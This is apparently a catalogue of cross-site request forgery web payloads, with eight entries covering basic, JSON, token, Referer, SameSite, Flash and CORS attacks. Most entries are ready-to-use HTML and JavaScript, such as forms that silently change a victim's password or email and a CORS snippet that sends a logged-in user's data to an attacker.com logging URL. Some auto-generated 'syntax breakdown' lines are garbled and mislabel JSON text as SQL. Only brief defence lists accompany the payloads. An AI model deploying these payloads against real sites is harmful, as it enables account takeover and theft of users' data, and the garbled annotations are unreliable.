# CSRF Cross-Site Request Forgery

_8 web payloads_

### CSRF Basic Attack  `csrf-basic`
_Basic techniques for cross-site request forgery attacks_
Subcategory: **Basic Attack** · tags: `csrf` `cross-site` `request` `forgery`

**Prerequisites:**
- The target has a sensitive operation
- Lacks CSRF protection

**Attack Chain:**

**1. Construct a CSRF form**
> Construct an auto-submitting CSRF form
```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```
**Syntax breakdown:**
- `action` — target URL _value_
- `hidden` — hidden field _value_
- `submit()` — auto-submit the form _function_

**2. GET request CSRF**
> CSRF attack via a GET request
```
<img src="http://target.com/delete?id=123" style="display:none">
Or directly induce the user to click:
http://target.com/delete?id=123
```
**Syntax breakdown:**
- `<img src>` — image tag makes an automatic request _tag_

**3. JSON CSRF**
> CSRF attack in JSON format
```
<script>
fetch("http://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```
**Syntax breakdown:**
- `credentials: "include"` — include cookies _value_
- `text/plain` — bypass the preflight request _value_

**4. Link luring**
> Induce the user to click
```
<a href="http://target.com/action?param=value">Click to claim your gift</a>
Or a shortened link to hide the real URL
```
**Syntax breakdown:**
- `<a` — command/keyword _command_

**WAF/EDR Bypass Variants:**

**Referer bypass**
> Bypass the Referer check
```
Use Referrer Policy:
<meta name="referrer" content="no-referrer">
Or use a data URL:
<data:text/html;base64,CSRF_PAYLOAD>
Or use an HTTPS->HTTP downgrade
```
**Syntax breakdown:**
- `no-referrer` — do not send the Referer header _value_

**Token bypass**
> Bypass Token validation
```
1. Check whether the Token is predictable
2. Check whether the Token is bound to the session
3. Check whether the Token is leaked in a GET parameter
4. Check whether there is a Token replay vulnerability
```
**Syntax breakdown:**
- `1.` — command/payload start _command_
- ` Check whether the Token is predictable
2. Check whether the Token is bound to the session
3. Check whether the Token is leaked in a GET parameter
4. Check whether there is a Token replay vulnerability` — parameters and payload content _value_

**Overview:** CSRF (Cross-Site Request Forgery) exploits the browser's behavior of automatically carrying cookies to induce an authenticated user to perform an attacker-predefined operation (such as transferring money, changing a password, or changing an email) without their knowledge.

**Vulnerability Principle:** CSRF vulnerabilities exist in sensitive operations that lack request source validation. The browser automatically attaches cookies when sending same-site requests. The attacker constructs a page containing a malicious form/request, and once the victim visits it, the browser automatically sends the request as the victim. Key conditions: the operation relies solely on cookie authentication and has no CSRF Token validation.

**Exploitation Method:** Complete exploitation flow:
1. Find a sensitive operation
2. Analyze the request format
3. Construct a malicious page
4. Induce the victim to visit it
5. Automatically execute the malicious request

**Defensive Measures:** Defenses:
1. Use a CSRF Token
2. Validate the Referer header
3. Use the SameSite Cookie attribute
4. Require secondary verification for critical operations

---

### JSON CSRF Attack  `csrf-json`
_CSRF attack techniques targeting JSON requests_
Subcategory: **JSON CSRF** · tags: `csrf` `json` `api` `post`

**Prerequisites:**
- The target uses JSON-format requests
- Lacks CSRF protection
- CORS is misconfigured

**Attack Chain:**

**1. Simple JSON CSRF**
> Use text/plain to bypass preflight
```
<script>
fetch("http://target.com/api/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```
**Syntax breakdown:**
- `fetch()` — initiate an HTTP request _function_
- `credentials: "include"` — include cookies _value_
- `text/plain` — bypass the CORS preflight _value_

**2. Flash JSON CSRF**
> Use Flash to send JSON
```
# Use Flash to send a JSON request
# Requires the target to allow Content-Type: application/json
# Combined with Flash's cross-domain capability
```
**Syntax breakdown:**
- `Content-Type` — content type header _header_

**3. XSSI attack**
> Cross-Site Script Inclusion attack
```
# Exploit a JSONP callback
<script src="http://target.com/api/data?callback=attacker"></script>
function attacker(data) { console.log(data); }

# Exploit an array return
[{"secret": "data"}]
<script>var data = [{"secret": "data"}];</script>
```
**Syntax breakdown:**
- `JSONP` — JSON with Padding _value_
- `callback` — callback function name _value_

**4. SWF file attack**
> Use an SWF file
```
# Create a malicious SWF file to send a JSON request
# Compile the ActionScript code
# Embed it in an HTML page
```

**WAF/EDR Bypass Variants:**

**Modify the Content-Type**
> Modify the Content-Type to bypass
```
# Try different Content-Types
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Try different Content-Types
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8` — parameters and payload content _value_

**Use FormData**
> Send using FormData
```
let formData = new FormData();
formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
fetch(url, {method: "POST", body: formData, credentials: "include"});
```
**Syntax breakdown:**
- `fetch()` — network request _function_

**Overview:** JSON CSRF attacks target API endpoints that receive JSON-format data. Although Content-Type: application/json usually triggers a preflight request (CORS protection), various bypass techniques make the attack possible.

**Vulnerability Principle:** JSON CSRF bypass methods: 1) send JSON-format data with the text/plain type (some backends still parse it) 2) use Flash to send a custom Content-Type (old browsers) 3) use the fetch API combined with a loose CORS policy 4) use Navigator.sendBeacon() to send a POST request.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the target API request format
2. Confirm the CORS configuration
3. Construct a JSON payload
4. Use text/plain to bypass preflight
5. Induce the user to trigger it

**Defensive Measures:** Defenses:
1. Validate the Content-Type
2. Use a CSRF Token
3. Configure CORS correctly
4. Validate the Origin header

---

### CSRF Bypass Techniques  `csrf-bypass`
_Various techniques for bypassing CSRF protection_
Subcategory: **Bypass Techniques** · tags: `csrf` `bypass` `token` `referer`

**Prerequisites:**
- The target has CSRF protection
- The protection mechanism has a flaw

**Attack Chain:**

**1. Token validation bypass**
> Bypass Token validation
```
# Token is predictable
Analyze the Token generation pattern and predict a valid Token

# Token not bound to the session
Use another user's Token

# Token reuse
The same Token can be used multiple times

# Token leaked in a GET parameter
Obtain the Token from the page source
```
**Syntax breakdown:**
- `Token is predictable` — the Token follows a pattern _value_
- `Token not bound` — the Token is unrelated to the session _value_

**2. Referer validation bypass**
> Bypass Referer validation
```
# Imprecise regex matching
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# Empty Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP downgrade
Redirecting from an HTTPS site to HTTP does not send the Referer
```
**Syntax breakdown:**
- `regex bypass` — exploit regex matching flaws _value_
- `no-referrer` — do not send the Referer _value_

**3. Origin validation bypass**
> Bypass Origin validation
```
# Origin is null
Use a data URL or about:blank

# Regex bypass
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11 does not send Origin
IE11 does not send the Origin header in some cases
```

**4. SameSite bypass**
> Bypass the SameSite restriction
```
# SameSite=Lax
GET requests send cookies
Construct the sensitive operation in GET form

# SameSite not set
The default behavior may allow cross-site sending

# Two-minute window
SameSite=Lax has a 2-minute window
```
**Syntax breakdown:**
- `SameSite=Lax` — GET requests allow cookies _value_
- `2-minute window` — the grace period of Lax mode _value_

**WAF/EDR Bypass Variants:**

**CORS misconfiguration**
> Exploit a CORS misconfiguration
```
# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
Allows any origin

# Reflected Origin
Access-Control-Allow-Origin: [any Origin]
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
Allows any origin

# Reflected Origin
Access-Control-Allow-Origin: [any Origin]` — parameters and payload content _value_

**Overview:** CSRF protection bypass techniques target various imperfect Token implementations, including common flaws such as predictable Token values, Tokens not bound to the session, static Token reuse, and validating only Token presence (not the value).

**Vulnerability Principle:** Common scenarios for CSRF Token bypass: 1) after deleting the Token parameter, the server does not validate it 2) an empty Token value passes validation 3) the Token is not bound to the Session (the attacker's own Token can be used) 4) the Token can be stolen via XSS 5) Referer validation using regex can be bypassed.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the CSRF protection mechanism
2. Find the validation flaw
3. Construct a bypass payload
4. Execute the CSRF attack

**Defensive Measures:** Defenses:
1. Use a secure Token mechanism
2. Bind the Token to the session
3. Strictly validate the Referer/Origin
4. Use SameSite=Strict

---

### SameSite Bypass Techniques  `csrf-samesite`
_CSRF attacks that bypass the SameSite Cookie attribute_
Subcategory: **SameSite Bypass** · tags: `csrf` `samesite` `cookie` `bypass`

**Prerequisites:**
- The Cookie has the SameSite attribute set
- The SameSite configuration has a flaw

**Attack Chain:**

**1. SameSite=Lax bypass**
> Bypass SameSite=Lax
```
# GET request bypass
Construct the sensitive operation in GET form
<img src="http://target.com/delete?id=123">

# Top-level navigation
<a href="http://target.com/action">Click</a>
window.location = "http://target.com/action"

# Two-minute window
Initiate the request within 2 minutes after user interaction
```
**Syntax breakdown:**
- `GET request` — Lax allows GET to carry cookies _value_
- `top-level navigation` — Lax allows top-level navigation _value_
- `2-minute window` — the grace period after user interaction _value_

**2. SameSite=Strict bypass**
> Bypass SameSite=Strict
```
# Subdomain attack
Initiate the request from a subdomain
http://sub.target.com/attack

# Cookie overwrite
Set a cookie with the same name to overwrite
Set-Cookie: session=attacker; Domain=.target.com

# Exploit a redirect
Redirect from the target site to the attack page
```

**3. SameSite not set**
> Exploit SameSite not being set
```
# Old browser default behavior
Chrome < 80 defaults to None
Safari defaults to None

# CSRF attack can be initiated directly
No special bypass required
```

**4. Exploit the OAuth flow**
> Exploit the OAuth flow
```
# OAuth callback bypasses SameSite
1. Initiate OAuth login
2. Inject a malicious request in the callback
3. Cookies are sent during the OAuth flow
```

**WAF/EDR Bypass Variants:**

**Mixed content**
> Exploit mixed content
```
# HTTPS->HTTP downgrade
Initiate an HTTP request from an HTTPS site
In some cases, SameSite is not sent
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` HTTPS->HTTP downgrade
Initiate an HTTP request from an HTTPS site
In some cases, SameSite is not sent` — parameters and payload content _value_

**Client-side redirect**
> Client-side redirect
```
# JavaScript redirect
location.href = "http://target.com/action"
May bypass some SameSite checks
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` JavaScript redirect
location.href = "http://target.com/action"
May bypass some SameSite checks` — parameters and payload content _value_

**Overview:** The SameSite Cookie attribute is a browser-level CSRF defense mechanism, but it can still be bypassed when misconfigured (e.g. SameSite=None) or when a GET request is used to trigger a state-changing operation, so it needs to be combined with other defenses.

**Vulnerability Principle:** SameSite bypass scenarios: 1) under SameSite=Lax, GET requests still carry cookies (targeting state changes via the GET method) 2) SameSite=None misconfiguration 3) cookie sharing between subdomains 4) bypassing the Lax restriction via window.open/top-level navigation 5) old browsers not supporting the SameSite attribute.

**Exploitation Method:** Complete exploitation flow:
1. Determine the SameSite configuration
2. Choose the appropriate bypass method
3. Construct a GET request or exploit the window period
4. Execute the CSRF attack

**Defensive Measures:** Defenses:
1. Use SameSite=Strict
2. Combine with a CSRF Token
3. Use POST for critical operations
4. Validate the request source

---

### Token Bypass Techniques  `csrf-token-bypass`
_Techniques for bypassing CSRF Token validation_
Subcategory: **Token Bypass** · tags: `csrf` `token` `bypass` `predictable`

**Prerequisites:**
- The target uses a CSRF Token
- The Token mechanism has a flaw

**Attack Chain:**

**1. Token is predictable**
> Predict the Token value
```
# Analyze the Token generation pattern
# Common weak Token patterns:
- Timestamp
- Incrementing number
- User ID hash
- Weak random number

# Predict and construct a valid Token
```
**Syntax breakdown:**
- `Timestamp` — a time-based Token _value_
- `Incrementing number` — a predictable sequence _value_

**2. Token not bound to the session**
> Exploit an unbound Token
```
# Token does not validate the session
# Attack steps:
1. The attacker obtains their own Token
2. Use that Token to construct the CSRF
3. Induce the victim to submit

# The Token can be used across users
```

**3. Token leakage**
> Exploit Token leakage
```
# Token leaked in the URL
http://target.com/page?token=xxx

# Token leaked in the Referer
Redirect from a page containing the Token

# Token leaked in logs
The server logs record the Token
```
**Syntax breakdown:**
- `URL leakage` — the Token appears in the URL _value_
- `Referer leakage` — leaked via the Referer header _value_

**4. Token replay**
> Token replay attack
```
# The Token can be reused
# Attack steps:
1. Obtain a valid Token
2. Use the same Token multiple times
3. The Token does not expire or become invalid
```

**5. Token deletion bypass**
> Bypass by deleting the Token
```
# Try deleting the Token parameter
POST /action HTTP/1.1
# Do not send the Token parameter

# Try an empty Token
POST /action?token=

# Try deleting the Token header
```

**WAF/EDR Bypass Variants:**

**Method override**
> Method override bypass
```
# Use the _method parameter
POST /action?_method=PUT&token=xxx

# Use X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Use the _method parameter
POST /action?_method=PUT&token=xxx

# Use X-HTTP-Method-Override
X-HTTP-Method-Override: PUT` — parameters and payload content _value_

**JSON format**
> JSON format bypass
```
# Submit in JSON format
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# May bypass Token validation
```
**Syntax breakdown:**
- `# Submit in JSON format
Content-Type: application/json
{"token": "xxx", "action": "` — SQL expression _value_
- `delete` — SQL keyword _keyword_
- `"}

# May bypass Token validation` — SQL expression _value_

**Overview:** CSRF Token bypass is the most common way to bypass CSRF protection, obtaining or predicting a valid Token value by analyzing the Token generation algorithm, exploiting implementation flaws, or combining with other vulnerabilities (such as XSS).

**Vulnerability Principle:** CSRF Token implementation flaws include: the Token is generated with a simple algorithm (e.g. MD5(timestamp)) and is predictable, the Token differs between the Cookie and the form but both are accepted, the Token is not validated on the server side and is only checked on the frontend, the Token is leaked in a URL parameter (Referer header), and the Token is too short to brute-force.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the Token generation mechanism
2. Check the Token binding relationship
3. Try to predict or obtain the Token
4. Construct the CSRF attack

**Defensive Measures:** Defenses:
1. Use a strong random Token
2. Bind the Token to the session
3. Make the Token single-use
4. Validate Token presence

---

### Referer Bypass Techniques  `csrf-referer-bypass`
_CSRF attacks that bypass Referer validation_
Subcategory: **Referer Bypass** · tags: `csrf` `referer` `bypass` `header`

**Prerequisites:**
- The target validates the Referer header
- The validation logic has a flaw

**Attack Chain:**

**1. Regex matching bypass**
> Exploit regex matching flaws
```
# Regex only checks for containment
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# Regex only checks the beginning
Referer: http://target.com.attacker.com/

# Regex only checks the end
Referer: http://attacker.com/target.com
```
**Syntax breakdown:**
- `containment match` — only checks whether the domain is contained _value_
- `beginning match` — only checks the beginning _value_
- `ending match` — only checks the end _value_

**2. Empty Referer bypass**
> Send an empty Referer
```
# Do not send the Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP downgrade
Redirect from an HTTPS site to HTTP
```
**Syntax breakdown:**
- `no-referrer` — the browser does not send the Referer _value_
- `data URL` — the data protocol has no source _value_

**3. Subdomain bypass**
> Exploit subdomains
```
# Initiate from a subdomain
Referer: http://sub.target.com/attack

# Initiate from a sibling domain
Referer: http://sibling.target.com/

# Exploit a subdomain XSS
Inject XSS on a subdomain to initiate the CSRF
```

**4. Referrer-Policy exploitation**
> Exploit Referrer-Policy
```
# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">
```

**WAF/EDR Bypass Variants:**

**iframe embedding**
> iframe bypass
```
# Use an iframe to embed the target
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox attribute
<iframe sandbox="allow-scripts" src="...">
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Use an iframe to embed the target
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox attribute
<iframe sandbox="allow-scripts" src="...">` — parameters and payload content _value_

**Flash/SWF**
> Flash controls the Referer
```
# Flash can control the Referer
# Compile an SWF to send a custom Referer
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Flash can control the Referer
# Compile an SWF to send a custom Referer` — parameters and payload content _value_

**Overview:** Referer validation is a supplementary means of CSRF defense, but because the Referer header can be manipulated or omitted, Referer-based protection is usually not reliable enough. Multiple techniques can bypass loose Referer validation logic.

**Vulnerability Principle:** Referer bypass techniques: 1) use Referrer-Policy: no-referrer to not send the Referer header 2) HTTPS→HTTP downgrade does not carry the Referer 3) a data: URI does not send the Referer 4) regex matching flaws (e.g. target.com.evil.com) 5) subdomain bypass (sub.target.com).

**Exploitation Method:** Complete exploitation flow:
1. Analyze the Referer validation logic
2. Construct a bypass domain
3. Use an empty Referer
4. Execute the CSRF attack

**Defensive Measures:** Defenses:
1. Strictly validate the Referer format
2. Reject an empty Referer
3. Use allowlist validation
4. Combine with a CSRF Token

---

### Flash CSRF Attack  `csrf-flash`
_Use Flash to perform a CSRF attack_
Subcategory: **Flash CSRF** · tags: `csrf` `flash` `swf` `crossdomain`

**Prerequisites:**
- The target allows Flash requests
- crossdomain.xml is misconfigured

**Attack Chain:**

**1. crossdomain.xml exploitation**
> Check the cross-domain policy file
```
# Check crossdomain.xml
http://target.com/crossdomain.xml

# Allow all domains
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

# Allow a specific domain
<allow-access-from domain="*.target.com"/>
```
**Syntax breakdown:**
- `crossdomain.xml` — Flash cross-domain policy file _path_
- `allow-access-from` — the allowed domain _value_

**2. Create a malicious SWF**
> Create a malicious Flash file
```
// ActionScript code
package {
  import flash.net.*;
  public class CSRF {
    public function CSRF() {
      var req:URLRequest = new URLRequest("http://target.com/api/action");
      req.method = URLRequestMethod.POST;
      req.data = "param=value";
      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
      sendToURL(req);
    }
  }
}
```
**Syntax breakdown:**
- `URLRequest` — Flash HTTP request class _value_
- `sendToURL` — send the request _value_

**3. Send a JSON request**
> Send a JSON-format request
```
// Flash can send any Content-Type
req.requestHeaders.push(
  new URLRequestHeader("Content-Type", "application/json")
);
req.data = JSON.stringify({email: "attacker@evil.com"});
```
**Syntax breakdown:**
- `Content-Type` — content type header _header_

**4. Custom Header**
> Add a custom header
```
// Flash can add a custom header
req.requestHeaders.push(
  new URLRequestHeader("X-Custom-Header", "value")
);

// Bypass some header validation
```
**Syntax breakdown:**
- `//` — command/keyword _command_

**WAF/EDR Bypass Variants:**

**Bypass the preflight request**
> Bypass the CORS preflight
```
# Flash can bypass the CORS preflight
# Directly send a POST request
# Carrying cookies
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Flash can bypass the CORS preflight
# Directly send a POST request
# Carrying cookies` — parameters and payload content _value_

**Overview:** Flash CSRF exploits Adobe Flash's cross-domain request capability to send HTTP requests with a custom Content-Type. Although Flash support ended in late 2020, understanding this technique remains valuable for understanding the evolution of CSRF attacks.

**Vulnerability Principle:** The principle of Flash CSRF: an SWF file can send a cross-domain request with a custom Content-Type (such as application/json) via URLRequest, bypassing the Content-Type restriction of browser HTML forms. It requires the target domain's crossdomain.xml configuration to allow cross-domain, or exploiting a 307 redirect to forward the request.

**Exploitation Method:** Complete exploitation flow:
1. Check crossdomain.xml
2. Create a malicious SWF
3. Embed it in an HTML page
4. Induce the user to visit

**Defensive Measures:** Defenses:
1. Configure a strict crossdomain.xml
2. Use a CSRF Token
3. Validate Origin/Referer
4. Disable Flash support

---

### CORS Misconfiguration Exploitation  `csrf-cors`
_Use a CORS misconfiguration to perform a CSRF attack_
Subcategory: **CORS Misconfiguration** · tags: `csrf` `cors` `misconfiguration` `api`

**Prerequisites:**
- CORS is misconfigured
- Cross-domain credential carrying is allowed

**Attack Chain:**

**1. Detect the CORS configuration**
> Detect the CORS configuration
```
# Send a test request
curl -H "Origin: http://attacker.com" http://target.com/api

# Check the response headers
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# Dangerous configuration
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
**Syntax breakdown:**
- `Access-Control-Allow-Origin` — the allowed origin _value_
- `Access-Control-Allow-Credentials` — allows credential carrying _value_

**2. Reflected Origin attack**
> Exploit a reflected Origin
```
# The server reflects any Origin
Access-Control-Allow-Origin: [the requested Origin]
Access-Control-Allow-Credentials: true

# Attack code
fetch("http://target.com/api/sensitive", {
  credentials: "include"
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```
**Syntax breakdown:**
- `fetch()` — network request _function_

**3. null origin attack**
> Exploit a null origin
```
# Allow the null origin
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Use a data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>
```
**Syntax breakdown:**
- `null` — the Origin of a data URL is null _keyword_

**4. Regex bypass**
> Regex matching bypass
```
# Imprecise regex matching
Allows: target.com
Bypass: attacktarget.com
target.com.attacker.com

# Attack code
fetch("http://target.com.api.attacker.com/api", {
  credentials: "include"
});
```
**Syntax breakdown:**
- `fetch()` — network request _function_

**WAF/EDR Bypass Variants:**

**Steal sensitive data**
> Steal user data
```
# Use CORS to steal data
fetch("http://target.com/api/user", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));
});
```
**Syntax breakdown:**
- `# Use CORS to steal data
fetch("http://target.com/api/user", {
  credentials: "include"
}` — attack payload _value_

**Perform a sensitive operation**
> Perform a sensitive operation
```
# Use CORS to perform an operation
fetch("http://target.com/api/delete", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});
```
**Syntax breakdown:**
- `# Use CORS to perform an operation
fetch("http://target.com/api/` — SQL expression _value_
- `delete` — SQL keyword _keyword_
- `", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});` — SQL expression _value_

**Overview:** A CORS (Cross-Origin Resource Sharing) misconfiguration can be exploited to bypass same-origin-policy CSRF protection, especially when Access-Control-Allow-Origin reflects the request's Origin header or is configured as a wildcard.

**Vulnerability Principle:** CORS-related CSRF risks: 1) Access-Control-Allow-Origin reflects any Origin 2) combined with Access-Control-Allow-Credentials: true to leak authentication data 3) an internal domain is in the allowlist, allowing an attack from the internal network 4) the null Origin is in the allowlist (an iframe sandbox can forge it).

**Exploitation Method:** Complete exploitation flow:
1. Detect the CORS configuration
2. Confirm that credentials are allowed
3. Construct a cross-domain request
4. Steal data or perform an operation

**Defensive Measures:** Defenses:
1. Use allowlist validation for the Origin
2. Do not reflect the Origin
3. Set Credentials cautiously
4. Use SameSite Cookies

---
